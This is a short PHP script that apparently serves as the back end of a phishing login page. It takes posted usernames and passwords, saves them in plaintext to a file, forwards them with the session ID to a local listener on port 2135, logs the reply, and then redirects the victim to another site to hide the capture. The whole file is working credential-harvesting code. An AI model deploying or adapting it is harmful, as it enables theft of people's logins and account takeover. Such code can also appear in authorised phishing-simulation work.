<?php
	error_reporting(0);
    if(isset($_POST['username']) && isset($_POST['password'])) {
          $awrt = $_POST['username'];
          $bwrt = $_POST['password'];
          $myFile = "exampletracking.txt";
          $fh = fopen($myFile, 'a') or die("can't open file");
          fwrite($fh, " Username: " . $awrt . " Password: " . $bwrt . "\r\n");
          fclose($fh);
          session_start();
          $curr_sess_id = session_id();
          $all_data = http_build_query(
              array(
                  'sess_id' => session_id(),
                  'username' => $_POST['username'],
                  'password' => $_POST['password']
                )
          );
          $http_query = array(
              'http' => array(
                  'method' => 'POST',
                  'header' => 'Content-type: application/x-www-form-urlencoded',
                  'timeout' => 3,
                  'content' => $all_data
              )
          );
          $local_url = "http://127.0.0.1:2135";
          $context = stream_context_create($http_query);
          $rtnval = file_get_contents($local_url, false, $context);
          $rtnval = $rtnval . " " . session_id();
          syslog(LOG_WARNING, $rtnval);
?>
          <script type="text/javascript">
          setTimeout(function () {
             window.location = "http://www.example.com";
          }, 4500);
      </script>
    <?php
      }
?>